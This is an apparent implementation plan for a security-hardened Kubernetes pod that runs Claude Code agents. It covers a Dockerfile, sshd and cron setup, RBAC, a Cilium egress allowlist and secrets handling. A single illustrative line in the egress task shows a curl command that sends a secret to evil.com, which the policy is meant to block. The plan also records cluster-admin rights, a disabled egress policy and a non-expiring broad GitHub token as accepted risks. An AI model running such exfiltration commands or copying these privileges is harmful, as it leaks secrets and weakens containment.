# Secure Agent Pod Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Deploy a security-hardened single-container Kubernetes pod on gpu-1 for running AI coding agents (Claude Code) with Cilium egress controls and VibeKanban (local mode) for agent orchestration, replacing the existing frank-kali workstation.

**Architecture:** Single-container pod (kali with VibeKanban as child process) with layered security: non-root user, dropped capabilities, Cilium egress allowlist, ESO-managed secrets, and dedicated ServiceAccount. All manifests follow the existing ArgoCD App-of-Apps raw-manifest pattern.

**Tech Stack:** Kali Linux (custom image), VibeKanban (local mode, SQLite), Cilium CiliumNetworkPolicy, External Secrets Operator, SOPS/age, ArgoCD

**Spec:** `docs/superpowers/specs/2026-03-30--agents--secure-agent-pod-design.md`

**Status:** Deployed

---

## Prerequisites (External to This Repo)

These tasks produce container images needed by the deployment. They must be completed before Task 7.

### Prereq A: Build the Secure Agent Kali Image

The existing `kalilinux/kali-rolling:latest` image runs as root. The new image must:

- Base: `kalilinux/kali-rolling`
- Create user `claude` (UID 1000, GID 1000) with home `/home/claude`
- Install: Claude Code CLI, kubectl, talosctl, omnictl, git, curl, openssh-server, node 22+, python3, bun, cron
- Do NOT install sudo
- Configure SSH: `sshd_config` with `Port 2222`, `PubkeyAuthentication yes`, `PasswordAuthentication no`, `PermitRootLogin no`, `AllowUsers claude`
- SSH host keys: entrypoint generates keys into `/home/claude/.ssh-host-keys/` (PVC-backed) on first boot, then symlinks them into `/etc/ssh/` on every boot. Keys persist across pod restarts.
- Cron env loader: create `/home/claude/.load-env.sh` that re-exports env vars from `/proc/1/environ` (K8s injects env vars into PID 1 but cron doesn't inherit them)
- Entrypoint: symlink SSH host keys, start sshd on port 2222, start cron, then sleep infinity

Push to `ghcr.io/derio-net/secure-agent-kali:<tag>`.

#### Dockerfile

```dockerfile
FROM kalilinux/kali-rolling

ARG TARGETARCH
ARG NODE_MAJOR=22
ARG TALOSCTL_VERSION=v1.9.5
ARG OMNICTL_VERSION=v0.45.1
ARG BUN_VERSION=1.2.5
ARG SUPERCRONIC_VERSION=0.2.33

# ── System packages (no sudo, no cron — supercronic replaces it) ──
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server \
    git \
    curl \
    wget \
    ca-certificates \
    gnupg \
    python3 \
    python3-pip \
    python3-venv \
    jq \
    unzip \
    less \
    vim-tiny \
    procps \
    && rm -rf /var/lib/apt/lists/*

# ── GitHub CLI ──
RUN curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg \
    | dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg \
    && echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" \
    > /etc/apt/sources.list.d/github-cli.list \
    && apt-get update && apt-get install -y --no-install-recommends gh \
    && rm -rf /var/lib/apt/lists/*

# ── Node.js 22 ──
RUN curl -fsSL https://deb.nodesource.com/setup_${NODE_MAJOR}.x | bash - \
    && apt-get install -y --no-install-recommends nodejs \
    && rm -rf /var/lib/apt/lists/*

# ── Bun ──
RUN curl -fsSL https://bun.sh/install | BUN_INSTALL=/usr/local bash -s "bun-v${BUN_VERSION}"

# ── kubectl ──
RUN curl -fsSL "https://dl.k8s.io/release/$(curl -sL https://dl.k8s.io/release/stable.txt)/bin/linux/${TARGETARCH}/kubectl" \
    -o /usr/local/bin/kubectl && chmod +x /usr/local/bin/kubectl

# ── talosctl ──
RUN curl -fsSL "https://github.com/siderolabs/talos/releases/download/${TALOSCTL_VERSION}/talosctl-linux-${TARGETARCH}" \
    -o /usr/local/bin/talosctl && chmod +x /usr/local/bin/talosctl

# ── omnictl ──
RUN curl -fsSL "https://github.com/siderolabs/omni/releases/download/${OMNICTL_VERSION}/omnictl-linux-${TARGETARCH}" \
    -o /usr/local/bin/omnictl && chmod +x /usr/local/bin/omnictl

# ── supercronic (non-root cron replacement) ──
RUN ARCH=$([ "${TARGETARCH}" = "arm64" ] && echo "arm64" || echo "amd64") \
    && curl -fsSL "https://github.com/aptible/supercronic/releases/download/v${SUPERCRONIC_VERSION}/supercronic-linux-${ARCH}" \
    -o /usr/local/bin/supercronic && chmod +x /usr/local/bin/supercronic

# ── Claude Code CLI + VibeKanban ──
# npm bootstrap — claude self-updates to ~/.local/ (PVC-backed) on first run
RUN npm install -g @anthropic-ai/claude-code vibe-kanban

# ── User: claude (UID 1000) ──
RUN groupadd -g 1000 claude \
    && useradd -m -u 1000 -g 1000 -s /bin/bash claude

# ── User-mode sshd config (runs as claude, no root needed) ──
# NOTE: All config files go under /opt/, NOT /home/claude/ — the PVC mount hides image contents
COPY sshd_config /opt/sshd_config

# ── Empty crontab template (copied to PVC on first boot by entrypoint) ──
RUN touch /opt/crontab

# ── Cron env loader (copied to PVC on first boot by entrypoint) ──
RUN printf '#!/bin/bash\nexport $(xargs -0 < /proc/1/environ)\n' > /opt/load-env.sh \
    && chmod +x /opt/load-env.sh

# ── Entrypoint ──
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

USER claude
WORKDIR /home/claude
EXPOSE 2222 8081
ENTRYPOINT ["/entrypoint.sh"]
```

#### sshd_config

```
# User-mode sshd — runs as claude (UID 1000), no root required
Port 2222
HostKey /home/claude/.ssh-host-keys/ssh_host_ed25519_key
HostKey /home/claude/.ssh-host-keys/ssh_host_rsa_key
AuthorizedKeysFile /home/claude/.ssh/authorized_keys
PubkeyAuthentication yes
PasswordAuthentication no
UsePAM no
StrictModes no
PidFile /home/claude/.ssh/sshd.pid
```

#### entrypoint.sh

```bash
#!/bin/bash
set -e

# ── First-boot: create directories on PVC with correct permissions ──
mkdir -p "$HOME/.ssh-host-keys" "$HOME/.ssh" "$HOME/repos"
chmod 700 "$HOME/.ssh-host-keys" "$HOME/.ssh"

# ── First-boot: seed config files from /opt/ templates ──
[ -f "$HOME/.crontab" ]     || cp /opt/crontab "$HOME/.crontab"
[ -f "$HOME/.load-env.sh" ] || cp /opt/load-env.sh "$HOME/.load-env.sh"

# ── Generate SSH host keys (first boot only, PVC-backed) ──
if [ ! -f "$HOME/.ssh-host-keys/ssh_host_ed25519_key" ]; then
    echo "[agent] Generating SSH host keys (first boot)..."
    ssh-keygen -t ed25519 -f "$HOME/.ssh-host-keys/ssh_host_ed25519_key" -N ""
    ssh-keygen -t rsa -b 4096 -f "$HOME/.ssh-host-keys/ssh_host_rsa_key" -N ""
fi
chmod 600 "$HOME/.ssh-host-keys"/ssh_host_*_key

# ── Copy authorized_keys from mounted Secret (if present) ──
if [ -f /etc/ssh-keys/authorized_keys ]; then
    cp /etc/ssh-keys/authorized_keys "$HOME/.ssh/authorized_keys"
    chmod 600 "$HOME/.ssh/authorized_keys"
fi

# ── Start sshd in user mode (no root needed) ──
/usr/sbin/sshd -f /opt/sshd_config -D &

# ── Start supercronic (non-root cron) ──
supercronic "$HOME/.crontab" &

# ── Start VibeKanban in local mode (SQLite, port 8081) ──
vibe-kanban &

echo "[agent] secure-agent-kali ready (sshd on :2222, supercronic active, vibe-kanban on :8081)"

# Wait for any child to exit — if sshd or supercronic dies, pod restarts
wait -n
```

**Fully non-root:** The Dockerfile sets `USER claude` and the deployment keeps `runAsUser: 1000` / `runAsNonRoot: true` / all capabilities dropped. sshd runs in user mode with its own config at `/opt/sshd_config`. `supercronic` replaces system cron. No root at any point.

#### GitHub Actions: `.github/workflows/build-secure-agent-kali.yml`

Place in the **frank-cluster** repo. Dockerfile + sshd_config + entrypoint.sh go in `apps/secure-agent-pod/docker/`.

```yaml
name: Build Secure Agent Kali Image

on:
  push:
    branches: [main]
    paths:
      - "apps/secure-agent-pod/docker/**"
  workflow_dispatch:

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository_owner }}/secure-agent-kali

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Docker metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,prefix=
            type=raw,value=latest

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: apps/secure-agent-pod/docker
          push: true
          platforms: linux/amd64
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

---

## File Structure

All new files under `apps/secure-agent-pod/`:

```
apps/secure-agent-pod/
  docker/
    Dockerfile                    # Kali image with vibe-kanban + tools
    sshd_config                   # User-mode sshd configuration
    entrypoint.sh                 # Process supervisor (sshd + supercronic + vibe-kanban)
  manifests/
    serviceaccount.yaml           # ServiceAccount + ClusterRoleBinding
    pvc-agent-home.yaml           # 50Gi RWO for /home/claude
    deployment.yaml               # Single-container pod (kali + vibe-kanban process)
    service-ssh.yaml              # LoadBalancer for SSH (192.168.55.215)
    service-vibekanban.yaml       # LoadBalancer for VibeKanban UI (192.168.55.218)
    cilium-egress.yaml            # CiliumNetworkPolicy (egress allowlist)
    externalsecret.yaml           # ESO ExternalSecret → Infisical
apps/root/templates/
  ns-secure-agent-pod.yaml        # Namespace with pod-security labels
  secure-agent-pod.yaml           # ArgoCD Application CR
secrets/secure-agent-pod/
  agent-secrets-tier2.yaml        # SOPS-encrypted manual secrets
  agent-configs.yaml              # SOPS-encrypted config files (talosconfig, etc.)
```

---

### Task 1: Namespace Template

Create the ArgoCD-managed namespace with appropriate pod security.

**Files:**
- Create: `apps/root/templates/ns-secure-agent-pod.yaml`

- [x] **Step 1: Create namespace template**

```yaml
# apps/root/templates/ns-secure-agent-pod.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: secure-agent-pod
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

Pod security is `baseline` (not `privileged`) — the pod runs non-root with all capabilities dropped. The `audit`/`warn` levels at `restricted` surface any future drift.

- [x] **Step 2: Commit** (cfbbf95)

```bash
git add apps/root/templates/ns-secure-agent-pod.yaml
git commit -m "feat(agents): add secure-agent-pod namespace template"
```

---

### Task 2: ServiceAccount and RBAC

Create a dedicated ServiceAccount with cluster-admin (per spec — accepted risk, auditable identity).

**Files:**
- Create: `apps/secure-agent-pod/manifests/serviceaccount.yaml`

- [x] **Step 1: Create ServiceAccount + ClusterRoleBinding**

```yaml
# apps/secure-agent-pod/manifests/serviceaccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: agent-sa
  namespace: secure-agent-pod
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: secure-agent-pod-cluster-admin
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: agent-sa
    namespace: secure-agent-pod
```

- [x] **Step 2: Commit** (54a244a)

```bash
git add apps/secure-agent-pod/manifests/serviceaccount.yaml
git commit -m "feat(agents): add secure-agent-pod serviceaccount and RBAC"
```

---

### Task 3: PVCs

One PVC for the agent home directory (stores repos, Claude config, VibeKanban SQLite DB).

**Files:**
- Create: `apps/secure-agent-pod/manifests/pvc-agent-home.yaml`
- ~~Create: `apps/secure-agent-pod/manifests/pvc-vibekanban-db.yaml`~~ (removed — no longer needed, VibeKanban uses SQLite on agent-home PVC)

- [x] **Step 1: Create agent-home PVC**

```yaml
# apps/secure-agent-pod/manifests/pvc-agent-home.yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: agent-home
  namespace: secure-agent-pod
spec:
  accessModes:
    - ReadWriteOnce
  storageClassName: longhorn
  resources:
    requests:
      storage: 50Gi
```

50Gi matches the existing Kali PVC size. Uses standard `longhorn` (replicated) not `longhorn-gpu-local` — data should survive node failure.

- [x] ~~**Step 2: Create vibekanban-db PVC**~~ (removed in fd2039e — VibeKanban uses SQLite on agent-home PVC)

- [x] **Step 3: Commit** (54a244a — batched with Task 2)

```bash
git add apps/secure-agent-pod/manifests/pvc-agent-home.yaml apps/secure-agent-pod/manifests/pvc-vibekanban-db.yaml
git commit -m "feat(agents): add secure-agent-pod PVCs"
```

---

### Task 4: Core Deployment

Single-container deployment. VibeKanban runs as a child process inside the kali container (local mode, SQLite). Uses `strategy: Recreate` because of RWO PVC.

**Files:**
- Create: `apps/secure-agent-pod/manifests/deployment.yaml`

- [x] **Step 1: Create the deployment manifest** (simplified from 4 containers to 1 in fd2039e)

See `apps/secure-agent-pod/manifests/deployment.yaml` for the current manifest (single container).

**Notes:**
- `agent-configs` and `agent-secrets-tier1/tier2` are `optional: true` — pod starts even without them
- `strategy: Recreate` — RWO PVC cannot be dual-mounted
- SSH host keys persist in `~/.ssh-host-keys/` on agent-home PVC
- SSH on port 2222 (non-root); Service maps external 22 → internal 2222
- VibeKanban runs as child process in local mode (SQLite on agent-home PVC, port 8081)

- [x] **Step 2: Commit** (c568c65, fix in d78581f)

```bash
git add apps/secure-agent-pod/manifests/deployment.yaml
git commit -m "feat(agents): add secure-agent-pod deployment (4 containers)"
```

---

### Task 5: Services

SSH LoadBalancer (reusing Kali's IP) and VibeKanban UI LoadBalancer.

**Files:**
- Create: `apps/secure-agent-pod/manifests/service-ssh.yaml`
- Create: `apps/secure-agent-pod/manifests/service-vibekanban.yaml`

- [x] **Step 1: Create SSH service**

```yaml
# apps/secure-agent-pod/manifests/service-ssh.yaml
apiVersion: v1
kind: Service
metadata:
  name: secure-agent-ssh
  namespace: secure-agent-pod
  annotations:
    lbipam.cilium.io/ips: "192.168.55.215"
spec:
  type: LoadBalancer
  selector:
    app: secure-agent-pod
  ports:
    - name: ssh
      port: 22
      targetPort: 2222  # Non-root sshd port inside container
      protocol: TCP
```

Reuses Kali's IP `192.168.55.215`. External clients connect to port 22; traffic is forwarded to container port 2222 (non-root sshd).

- [x] **Step 2: Create VibeKanban UI service**

The spec says VibeKanban is accessed via Tailscale only. A LoadBalancer on the LAN makes it reachable from Tailscale subnet routes. No Caddy/public exposure.

```yaml
# apps/secure-agent-pod/manifests/service-vibekanban.yaml
apiVersion: v1
kind: Service
metadata:
  name: secure-agent-vibekanban
  namespace: secure-agent-pod
  annotations:
    lbipam.cilium.io/ips: "192.168.55.218"
spec:
  type: LoadBalancer
  selector:
    app: secure-agent-pod
  ports:
    - name: http
      port: 8081
      targetPort: vk-http
      protocol: TCP
```

IP `192.168.55.218` — next available after Tekton Dashboard at .217.

- [x] **Step 3: Commit** (ff37d89)

```bash
git add apps/secure-agent-pod/manifests/service-ssh.yaml apps/secure-agent-pod/manifests/service-vibekanban.yaml
git commit -m "feat(agents): add secure-agent-pod services (SSH + VibeKanban)"
```

---

### Task 6: Cilium Egress Network Policy

This is the first CiliumNetworkPolicy in the cluster. Default-deny egress with explicit allowlist.

**Files:**
- Create: `apps/secure-agent-pod/manifests/cilium-egress.yaml`

- [x] **Step 1: Create the CiliumNetworkPolicy**

```yaml
# apps/secure-agent-pod/manifests/cilium-egress.yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: agent-egress
  namespace: secure-agent-pod
spec:
  endpointSelector:
    matchLabels:
      app: secure-agent-pod
  egress:
    # DNS (required for FQDN-based rules to resolve)
    - toEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: kube-system
            k8s-app: kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP

    # Claude API
    - toFQDNs:
        - matchName: api.anthropic.com
      toPorts:
        - ports:
            - port: "443"

    # Telegram Bot API (agent notifications)
    - toFQDNs:
        - matchName: api.telegram.org
      toPorts:
        - ports:
            - port: "443"

    # GitHub (git clone/push, API, container registry)
    - toFQDNs:
        - matchName: github.com
        - matchPattern: "*.github.com"
        - matchName: ghcr.io
        - matchPattern: "*.ghcr.io"
      toPorts:
        - ports:
            - port: "443"
            - port: "22"

    # Cloudflare R2 (backup access)
    - toFQDNs:
        - matchPattern: "*.r2.cloudflarestorage.com"
      toPorts:
        - ports:
            - port: "443"

    # npm + PyPI (dependency installs)
    - toFQDNs:
        - matchName: registry.npmjs.org
        - matchName: pypi.org
        - matchName: files.pythonhosted.org
      toPorts:
        - ports:
            - port: "443"

    # Cluster-internal (LAN services, Tailscale subnet)
    - toCIDR:
        - 192.168.55.0/24
        - 192.168.50.0/24

    # K8s API server (kubectl from inside pod)
    - toEntities:
        - kube-apiserver
```

**What this blocks:** All egress not in the allowlist. `curl https://evil.com -d "$SECRET"` fails at the Cilium datapath before leaving the node.

- [x] **Step 2: Commit** (a3aa519 — batched with Task 7)

```bash
git add apps/secure-agent-pod/manifests/cilium-egress.yaml
git commit -m "feat(agents): add CiliumNetworkPolicy for secure-agent-pod egress"
```

---

### Task 7: ExternalSecret (Infisical)

Use the existing `ClusterSecretStore: infisical` (not a namespace-scoped SecretStore — the cluster already has one).

**Files:**
- Create: `apps/secure-agent-pod/manifests/externalsecret.yaml`

- [x] **Step 1: Create ExternalSecret**

```yaml
# apps/secure-agent-pod/manifests/externalsecret.yaml
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata:
  name: agent-secrets-infisical
  namespace: secure-agent-pod
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: infisical
    kind: ClusterSecretStore
  target:
    name: agent-secrets-tier1
    creationPolicy: Owner
  data:
    - secretKey: ANTHROPIC_API_KEY
      remoteRef:
        key: ANTHROPIC_API_KEY
```

Populate `data` entries as secrets are added to Infisical. Start with just `ANTHROPIC_API_KEY`.

**Note:** ExternalSecret was later removed from manifests because Claude Code authenticates via Max subscription login (`claude login`), not via `ANTHROPIC_API_KEY` env var. See commit 7d02c06. Re-add this manifest when Infisical-managed secrets are needed.

- [x] **Step 2: Commit** (a3aa519 — batched with Task 6)

```bash
git add apps/secure-agent-pod/manifests/externalsecret.yaml
git commit -m "feat(agents): add ExternalSecret for secure-agent-pod (Infisical)"
```

---

### Task 8: ArgoCD Application CR

Wire the manifests directory into the root App-of-Apps.

**Files:**
- Create: `apps/root/templates/secure-agent-pod.yaml`

- [x] **Step 1: Create Application CR template**

```yaml
# apps/root/templates/secure-agent-pod.yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: secure-agent-pod
  namespace: argocd
  finalizers:
    - resources-finalizer.argocd.argoproj.io
spec:
  project: infrastructure
  source:
    repoURL: {{ .Values.repoURL }}
    targetRevision: {{ .Values.targetRevision }}
    path: apps/secure-agent-pod/manifests
  destination:
    server: {{ .Values.destination.server }}
    namespace: secure-agent-pod
  syncPolicy:
    automated:
      prune: false
      selfHeal: true
    syncOptions:
      - CreateNamespace=false
      - ServerSideApply=true
      - RespectIgnoreDifferences=true
  ignoreDifferences:
    - group: ""
      kind: Secret
      jsonPointers:
        - /data
```

- [x] **Step 2: Commit** (a0a6c15 — batched with Task 9)

```bash
git add apps/root/templates/secure-agent-pod.yaml
git commit -m "feat(agents): add ArgoCD Application CR for secure-agent-pod"
```

---

### Task 9: SOPS-Encrypted Bootstrap Secrets

# manual-operation
```yaml
id: secure-agent-pod-bootstrap-secrets
layer: agents
app: secure-agent-pod
plan: 2026-03-30--agents--secure-agent-pod
when: Before first ArgoCD sync
why_manual: Bootstrap secrets must exist before ESO can sync; SOPS decryption requires manual key access
status: done
commands:
  # 1. Create tier-2 manual secrets
  - |
    cat <<'EOF' > secrets/secure-agent-pod/agent-secrets-tier2.yaml
    apiVersion: v1
    kind: Secret
    metadata:
      name: agent-secrets-tier2
      namespace: secure-agent-pod
    type: Opaque
    stringData:
      GITHUB_TOKEN: "<github-pat>"
    EOF
    sops --encrypt --in-place secrets/secure-agent-pod/agent-secrets-tier2.yaml

  # 3. Create config file secrets (talosconfig, kubeconfig, omniconfig)
  - |
    kubectl create secret generic agent-configs \
      --namespace=secure-agent-pod \
      --from-file=talosconfig=./talosconfig.yaml \
      --from-file=kubeconfig=./kubeconfig.yaml \
      --from-file=omniconfig=./omniconfig.yaml \
      --dry-run=client -o yaml > secrets/secure-agent-pod/agent-configs.yaml
    sops --encrypt --in-place secrets/secure-agent-pod/agent-configs.yaml

  # 3. Apply all secrets
  - sops --decrypt secrets/secure-agent-pod/agent-secrets-tier2.yaml | kubectl apply -f -
  - sops --decrypt secrets/secure-agent-pod/agent-configs.yaml | kubectl apply -f -

verify:
  - kubectl get secret agent-secrets-tier2 -n secure-agent-pod
  - kubectl get secret agent-configs -n secure-agent-pod
```

**Files:**
- Create: `secrets/secure-agent-pod/` directory (SOPS-encrypted files, applied out-of-band per repo principles)

- [x] **Step 1: Create the secrets directory placeholder**

```bash
mkdir -p secrets/secure-agent-pod
echo "# SOPS-encrypted bootstrap secrets for secure-agent-pod" > secrets/secure-agent-pod/README.md
echo "# Apply with: sops --decrypt <file> | kubectl apply -f -" >> secrets/secure-agent-pod/README.md
```

- [x] **Step 2: Commit placeholder** (a0a6c15 — batched with Task 8)

```bash
git add secrets/secure-agent-pod/README.md
git commit -m "feat(agents): add secrets directory for secure-agent-pod"
```

- [x] **Step 3: Create and encrypt secrets (manual — see manual-operation block above)**

Generate real values, SOPS-encrypt, commit the encrypted files. Apply to cluster before deploying.

- [x] **Step 4: Migrate GITHUB_TOKEN to ESO** (62b05c7)

Replaced SOPS-encrypted `agent-secrets-tier2` with an ExternalSecret syncing `GITHUB_SECURE_AGENT_POD` from Infisical. The secret key is still `GITHUB_TOKEN` in the K8s Secret (mapped via `remoteRef`). See `apps/secure-agent-pod/manifests/externalsecret-github-token.yaml`.

---

### Task 10: Configure Infisical

# manual-operation
```yaml
id: secure-agent-pod-infisical-setup
layer: agents
app: secure-agent-pod
plan: 2026-03-30--agents--secure-agent-pod
when: Before first ArgoCD sync (after Task 9)
why_manual: Infisical project/secret creation requires Infisical UI; ESO universal auth token must be provisioned
status: complete
commands:
  # 1. In Infisical UI: create secrets under the project
  - "Navigate to Infisical → project → Add secret: ANTHROPIC_API_KEY"
  # NOTE: ANTHROPIC_API_KEY already existed in Infisical — no creation needed

  # 2. Verify ESO can sync
  - kubectl get externalsecret agent-secrets-infisical -n secure-agent-pod
  - kubectl get secret agent-secrets-tier1 -n secure-agent-pod

verify:
  - kubectl get externalsecret agent-secrets-infisical -n secure-agent-pod -o jsonpath='{.status.conditions[0].status}'
  # Should return "True"
```

- [x] **Step 1: Add ANTHROPIC_API_KEY to Infisical project as ANTHROPIC_API_KEY** (already existed)
- [x] **Step 2: Verify ExternalSecret syncs after deployment** (confirmed: agent-secrets-tier1 created, ESO status True)

---

### Task 11: Kali Decommission

Remove the existing frank-kali workstation after secure-agent-pod is verified working.

**Files:**
- Delete: `apps/kali/manifests/deployment.yaml`
- Delete: `apps/kali/manifests/service.yaml`
- Delete: `apps/kali/manifests/pvc.yaml`
- Delete: `apps/kali/manifests/configmap.yaml`
- Delete: `apps/kali/manifests/secret.yaml`
- Delete: `apps/root/templates/kali.yaml`
- Delete: `apps/root/templates/ns-kali.yaml`
- Modify: `README.md` (remove Kali from service table, add secure-agent-pod)
- Modify: `.claude/rules/frank-infrastructure.md` (update service table)

- [x] **Step 1: Verify secure-agent-pod is fully operational** — 6/9 PASS, 1 SKIP (Cilium), 2 pending manual (SSH + VK UI via Tailscale)

- [x] **Step 2: Scale down Kali**

```bash
source .env
kubectl scale deployment kali -n kali-system --replicas=0
```

Verify nothing depends on the Kali pod. Wait 24h.

- [x] **Step 3: Remove Kali manifests and ArgoCD templates** (d5b6901)

```bash
rm -rf apps/kali/
rm apps/root/templates/kali.yaml
rm apps/root/templates/ns-kali.yaml
```

- [x] **Step 4: Update infrastructure docs** (d5b6901)

Update `.claude/rules/frank-infrastructure.md`:
- Replace `Kali Workstation | 192.168.55.215 | Cilium L2 LoadBalancer (port 22/SSH)` with `Secure Agent Pod (SSH) | 192.168.55.215 | Cilium L2 LoadBalancer (port 22/SSH)`
- Add `Secure Agent Pod (VibeKanban) | 192.168.55.218 | Cilium L2 LoadBalancer (port 8081)`

- [x] **Step 5: Commit** (d5b6901)

```bash
git add -A apps/kali/ apps/root/templates/kali.yaml apps/root/templates/ns-kali.yaml .claude/rules/frank-infrastructure.md
git commit -m "feat(agents): decommission frank-kali, replaced by secure-agent-pod"
```

- [x] **Step 6: Clean up Kali namespace (manual)** — PVC, deployment, service, secrets, configmap, namespace all deleted

# manual-operation
```yaml
id: secure-agent-pod-kali-cleanup
layer: agents
app: secure-agent-pod
plan: 2026-03-30--agents--secure-agent-pod
when: After Kali manifests removed and ArgoCD synced
why_manual: PVC data deletion is destructive and irreversible; requires human confirmation
status: done
commands:
  - kubectl delete pvc kali-data -n kali-system
  - kubectl delete namespace kali-system
verify:
  - kubectl get namespace kali-system  # Should return "not found"
```

---

### Task 12: Verification

Run all spec verification checks after deployment.

- [x] **Step 1: Non-root** — `uid=1000(claude) gid=1000(claude)`

- [x] **Step 2: No sudo** — `sudo not found`

- [ ] **Step 3: Egress blocked** — SKIP: Cilium FQDN policy temporarily disabled (Cilium 1.17 LRU bug)

- [x] **Step 4: Egress allowed** — HTTP 404 from Anthropic (connection succeeds)

- [x] **Step 5: Secrets injected** — `ANTHROPIC_API_KEY` set via ESO, no `.env` file

- [x] **Step 6: VibeKanban healthy** — process running, HTTP 200 on port 8081 (`PORT=8081`, `HOST=0.0.0.0`)

- [x] **Step 7: PVC persistence** — SSH host keys persist across pod restarts

- [x] **Step 8: VibeKanban UI access** — confirmed via Tailscale at `http://192.168.55.218:8081`

- [x] **Step 9: SSH access** — confirmed: `ssh claude@192.168.55.215`

---

## Deployment Deviations

_Document any deviations from the spec discovered during implementation here._

- **SSH port:** Container uses port 2222 (non-root cannot bind port 22). Service maps external 22 → internal 2222. No functional difference for SSH clients.
- **ESO API version:** Spec uses `v1beta1`, cluster uses `v1`. Plan uses `v1`.
- **SecretStore scope:** Spec creates a namespace-scoped `SecretStore`. Cluster already has `ClusterSecretStore: infisical`. Plan reuses the existing ClusterSecretStore.
- **VibeKanban LB service:** Spec says Tailscale-only access with no Caddy. Plan adds a LAN-facing LoadBalancer (reachable via Tailscale subnet routes) at `192.168.55.218:8081`.
- **Pod security baseline:** Spec doesn't specify namespace PSS level. Plan uses `baseline` (enforce) with `restricted` (audit/warn).
- **VibeKanban architecture:** Spec originally designed 3-container sidecar (server + PostgreSQL + ElectricSQL). Testing revealed remote-server doesn't expose local workspace to sessions. Simplified to in-container process using local mode (SQLite). Removed Prereq B, vibekanban-db PVC, vibekanban-secrets, and 3 sidecar container definitions.
- **Infisical key name:** Spec used `SECURE_AGENT_ANTHROPIC_API_KEY`. Existing Infisical project uses `ANTHROPIC_API_KEY`. Updated ExternalSecret to match.
- **VibeKanban port binding:** Defaults to random port with `HOST=127.0.0.1`. Required `PORT=8081` and `HOST=0.0.0.0` env vars in deployment for fixed port and external access.
- **PVC mount path conflict:** `/run/secrets` mount for agent-configs conflicted with K8s SA token mount at `/var/run/secrets/kubernetes.io/serviceaccount`. Moved to `/home/claude/.kube/configs`.
- **Image files hidden by PVC:** All files Dockerfile placed under `/home/claude/` (entrypoint, sshd_config, .crontab, .load-env.sh) are hidden by the PVC mount. Moved to `/opt/` and `/entrypoint.sh`; entrypoint seeds PVC on first boot.
- **Cilium FQDN egress policy:** Invalid on Cilium 1.17 ("LRU not yet initialized"). Temporarily disabled — manifests moved to `cilium-egress.yaml.disabled`. Re-enable after Cilium upgrade or workaround found.
- **ExternalSecret removed:** Claude Code authenticates via Max subscription login, not ANTHROPIC_API_KEY env var. ExternalSecret manifest deleted (7d02c06). Re-add when Infisical-managed secrets are needed.
- **GitHub CLI added:** `gh` not in Kali base repos — requires adding the official GitHub CLI apt repository before installing. Added in image `22a2915`.
- **GITHUB_TOKEN migrated to ESO:** `agent-secrets-tier2` was originally a SOPS-encrypted manual secret. Replaced with an ExternalSecret (62b05c7) syncing `GITHUB_SECURE_AGENT_POD` from Infisical as `GITHUB_TOKEN`. Originally a fine-grained PAT; replaced with a classic PAT (2026-04-05) for `clawdia-ai-assistant` with `repo`, `write:packages`, `workflow`, `project`, `admin:org` scopes — no expiry. See `willikins/docs/superpowers/specs/2026-04-05-github-token-replacement-design.md`.
- **Image pinned to SHA:** Deployment image changed from `:latest` to `:22a2915` (56b15a3). SHA tags are pushed alongside `latest` by the GitHub Actions build workflow.
- **Git identity:** Pod uses `Clawdia <clawdia-ai-assistant@gmail.com>` for git commits, matching the GitHub bot user. Git credential helper configured to use `$GITHUB_TOKEN` dynamically (no PAT embedded in remote URLs).
- **Agent scripts baked into image (2026-04-04):** Pod infrastructure scripts (guardrails hook, session manager, exercise cron, audit digest, Telegram notifications, heartbeat push) moved from `willikins/scripts/willikins-agent/` to the `secure-agent-kali` image at `/opt/scripts/` (immutable, always from image). Config templates (crontab, `.bashrc`, `settings.json`) baked at `/opt/` and seeded to PVC on first boot (user-modifiable). Bug fixes: exercise schedule `1-5` → `0,1,5,6` (Fri-Mon), audit digest heartbeat on empty-log path, `.bashrc` extracts secrets from `/proc/1/environ` instead of hardcoding.
